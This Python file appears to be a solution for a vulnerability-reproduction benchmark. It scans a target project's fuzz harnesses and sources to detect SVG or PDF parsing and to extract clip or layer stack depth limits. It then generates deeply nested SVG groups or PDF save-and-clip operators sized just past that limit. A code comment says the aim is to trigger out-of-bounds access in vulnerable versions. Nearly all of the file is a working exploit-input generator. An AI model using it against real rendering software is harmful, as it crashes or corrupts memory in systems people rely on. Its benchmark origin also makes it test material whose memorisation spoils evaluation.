import os
import re
import tarfile
from collections import defaultdict
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 3_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    yield os.path.relpath(path, root).replace(os.sep, "/"), f.read()
            except OSError:
                continue


def _iter_files_from_tar(tar_path: str) -> Iterable[Tuple[str, bytes]]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > 3_000_000:
                continue
            name = m.name
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                yield name, data
            except Exception:
                continue


def _is_interesting_name(name_l: str) -> bool:
    keys = (
        "fuzz",
        "fuzzer",
        "clip",
        "layer",
        "stack",
        "nest",
        "render",
        "canvas",
        "svg",
        "pdf",
        "ps",
        "eps",
        "gfx",
        "graphic",
        "parser",
        "decode",
    )
    return any(k in name_l for k in keys)


def _safe_decode(b: bytes) -> str:
    return b.decode("utf-8", errors="ignore")


def _score_kind_from_text(text_l: bytes) -> Dict[str, int]:
    s: Dict[str, int] = defaultdict(int)

    svg_tokens = [
        b"lunasvg",
        b"resvg",
        b"usvg",
        b"nanosvg",
        b"sksvg",
        b"svgdom",
        b"svgrender",
        b"sk_svg",
        b".svg",
        b"<svg",
        b"clip-path",
        b"clippath",
        b"svg",
    ]
    pdf_tokens = [
        b"%pdf",
        b".pdf",
        b"mupdf",
        b"fitz",
        b"pdfium",
        b"fpdf_",
        b"pdf_load",
        b"pdf_open",
        b"pdf_document",
        b"cpdf",
        b"poppler",
        b"xref",
        b"startxref",
        b"/type /catalog",
        b"pdf",
    ]
    lottie_tokens = [
        b"rlottie",
        b"skottie",
        b"bodymovin",
        b"lottie",
        b"thorvg",
        b"json",
        b"nlohmann::json",
    ]

    for t in svg_tokens:
        if t in text_l:
            s["svg"] += 2 if t in (b"lunasvg", b"resvg", b"usvg", b"nanosvg", b"sksvg", b"<svg") else 1
    for t in pdf_tokens:
        if t in text_l:
            s["pdf"] += 2 if t in (b"%pdf", b"mupdf", b"fitz", b"pdfium", b"fpdf_", b"startxref") else 1
    for t in lottie_tokens:
        if t in text_l:
            s["lottie"] += 2 if t in (b"rlottie", b"skottie", b"bodymovin", b"lottie") else 1

    return s


_NUM_EXPR_RE = re.compile(r"^\(?\s*([0-9]+|0x[0-9a-fA-F]+)\s*([uUlL]*)\s*\)?$")


def _parse_int_expr(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    if len(expr) > 64:
        return None
    expr = expr.replace("\t", " ").strip()
    expr = expr.strip("()")
    m = _NUM_EXPR_RE.match(expr)
    if m:
        try:
            return int(m.group(1), 0)
        except Exception:
            return None
    if "<<" in expr:
        parts = expr.split("<<")
        if len(parts) == 2:
            a = _parse_int_expr(parts[0])
            b = _parse_int_expr(parts[1])
            if a is not None and b is not None and 0 <= b <= 30:
                v = a << b
                return v
    return None


def _extract_depth_candidates(text: str) -> List[int]:
    out: List[int] = []

    patterns = [
        re.compile(r"\b(?:kMax|MAX)[A-Za-z0-9_]*(?:Depth|Nesting|Stack)[A-Za-z0-9_]*\s*(?:=|:)\s*([^;,\n]+)"),
        re.compile(r"\b#define\s+(?:kMax|MAX)[A-Za-z0-9_]*(?:DEPTH|NESTING|STACK)[A-Za-z0-9_]*\s+(.+)$", re.MULTILINE),
    ]
    for p in patterns:
        for m in p.finditer(text):
            expr = m.group(1).strip()
            expr = expr.split("//", 1)[0].strip()
            expr = expr.split("/*", 1)[0].strip()
            val = _parse_int_expr(expr)
            if val is not None:
                out.append(val)

    for line in text.splitlines():
        ll = line.lower()
        if ("clip" in ll and "stack" in ll) or ("layer" in ll and "stack" in ll) or ("nest" in ll and "depth" in ll):
            for m in re.finditer(r"\[\s*([0-9]+|0x[0-9a-fA-F]+)\s*\]", line):
                val = _parse_int_expr(m.group(1))
                if val is not None:
                    out.append(val)
            for m in re.finditer(r"\b([0-9]+|0x[0-9a-fA-F]+)\b", line):
                val = _parse_int_expr(m.group(1))
                if val is not None:
                    out.append(val)

    filtered = []
    for v in out:
        if 8 <= v <= 500_000:
            filtered.append(v)
    return filtered


def _choose_kind_and_depth(src_path: str) -> Tuple[str, Optional[int], bool]:
    if os.path.isdir(src_path):
        it = _iter_files_from_dir(src_path)
    else:
        it = _iter_files_from_tar(src_path)

    harness_texts: List[bytes] = []
    relevant_texts: List[str] = []
    scores: Dict[str, int] = defaultdict(int)
    pdf_full_doc_hint = False

    keyword_hits = [b"clip mark", b"clip stack", b"layer/clip", b"nesting depth", b"push clip", b"clipmark"]

    for name, data in it:
        name_l = name.lower()
        if not _is_interesting_name(name_l):
            continue

        low = data.lower()

        is_harness = b"llvmfuzzertestoneinput" in low or "fuzzer" in name_l or "fuzz" in name_l
        is_relevant = any(k in low for k in keyword_hits)

        if is_harness:
            harness_texts.append(low[:400_000])
            sc = _score_kind_from_text(low)
            for k, v in sc.items():
                scores[k] += v * 5
            if b"fpdf_loadmemdocument" in low or b"fz_open_document" in low or b"pdf_load_document" in low or b"pdf_open_document" in low:
                pdf_full_doc_hint = True

        if is_relevant:
            t = _safe_decode(data)
            relevant_texts.append(t)

        if (not is_harness) and (not is_relevant):
            if b".svg" in low or b"<svg" in low or b"lunasvg" in low or b"resvg" in low or b"usvg" in low or b"sksvg" in low:
                scores["svg"] += 2
            if b"%pdf" in low or b"mupdf" in low or b"fitz" in low or b"pdfium" in low or b"fpdf_" in low:
                scores["pdf"] += 2

    if harness_texts:
        combined = b"\n".join(harness_texts)
        sc = _score_kind_from_text(combined)
        for k, v in sc.items():
            scores[k] += v * 20

    kind = "svg"
    if scores:
        kind = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores.get("pdf", 0) == scores.get("svg", 0) and scores.get("pdf", 0) != 0:
            kind = "svg"

    depth_candidates: List[int] = []
    for t in relevant_texts:
        depth_candidates.extend(_extract_depth_candidates(t))

    if not depth_candidates and harness_texts:
        ht = _safe_decode(b"\n".join(harness_texts))
        depth_candidates.extend(_extract_depth_candidates(ht))

    depth_limit = max(depth_candidates) if depth_candidates else None
    return kind, depth_limit, pdf_full_doc_hint


def _generate_svg(depth: int, max_size: int = 900_000) -> bytes:
    base = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<defs><clipPath id=\"c\"><rect width=\"1\" height=\"1\"/></clipPath></defs>"
    )
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b"</g>"
    end = b"</svg>"

    per = len(open_tag) + len(close_tag)
    base_len = len(base) + len(end)
    if base_len + depth * per > max_size:
        depth = max(1, (max_size - base_len) // per)

    return base + (open_tag * depth) + (close_tag * depth) + end


def _build_pdf(objects: List[bytes]) -> bytes:
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    out = bytearray()
    out.extend(header)

    offsets = [0] * (len(objects) + 1)
    offsets[0] = 0

    for i, obj in enumerate(objects, start=1):
        offsets[i] = len(out)
        out.extend(obj)
        if not obj.endswith(b"\n"):
            out.extend(b"\n")

    xref_offset = len(out)
    n = len(objects) + 1
    out.extend(b"xref\n")
    out.extend(f"0 {n}\n".encode("ascii"))
    out.extend(b"0000000000 65535 f \n")
    for i in range(1, n):
        off = offsets[i]
        out.extend(f"{off:010d} 00000 n \n".encode("ascii"))

    out.extend(b"trailer\n")
    out.extend(f"<< /Size {n} /Root 1 0 R >>\n".encode("ascii"))
    out.extend(b"startxref\n")
    out.extend(f"{xref_offset}\n".encode("ascii"))
    out.extend(b"%%EOF\n")
    return bytes(out)


def _generate_pdf_full(depth: int, max_size: int = 900_000) -> bytes:
    # Per-iteration is kept compact but includes save+clip to reliably exercise layer/clip stack logic in many engines.
    op = b"q 0 0 1 1 re W n\n"
    base_stream_overhead = 0
    approx_base_pdf = 600  # rough; used only for capping depth
    if approx_base_pdf + base_stream_overhead + depth * len(op) > max_size:
        depth = max(1, (max_size - approx_base_pdf - base_stream_overhead) // len(op))

    stream = op * depth

    # Objects:
    # 1: Catalog
    # 2: Pages
    # 3: Page
    # 4: Contents
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\nendobj\n"
    obj4 = (
        b"4 0 obj\n"
        + f"<< /Length {len(stream)} >>\n".encode("ascii")
        + b"stream\n"
        + stream
        + b"endstream\nendobj\n"
    )
    return _build_pdf([obj1, obj2, obj3, obj4])


def _generate_pdf_stream_only(depth: int, max_size: int = 900_000) -> bytes:
    op = b"q 0 0 1 1 re W n\n"
    if depth * len(op) > max_size:
        depth = max(1, max_size // len(op))
    return op * depth


class Solution:
    def solve(self, src_path: str) -> bytes:
        kind, depth_limit, pdf_full_hint = _choose_kind_and_depth(src_path)

        if depth_limit is None:
            # Defaults tuned to stay near (or below) common 1MB fuzz input limits.
            if kind == "pdf":
                depth = 45_000
            else:
                depth = 33_000
        else:
            # Exceed by a small margin to trigger OOB in vulnerable versions while staying compact.
            depth = depth_limit + 32
            if kind == "svg" and depth < 2048:
                depth = max(depth, 4096)
            if kind == "pdf" and depth < 2048:
                depth = max(depth, 8192)

        if kind == "pdf":
            if pdf_full_hint:
                return _generate_pdf_full(depth, max_size=900_000)
            # If the harness appears to process streams/operators directly, prefer stream-only.
            return _generate_pdf_stream_only(depth, max_size=900_000)

        # Default to SVG
        return _generate_svg(depth, max_size=900_000)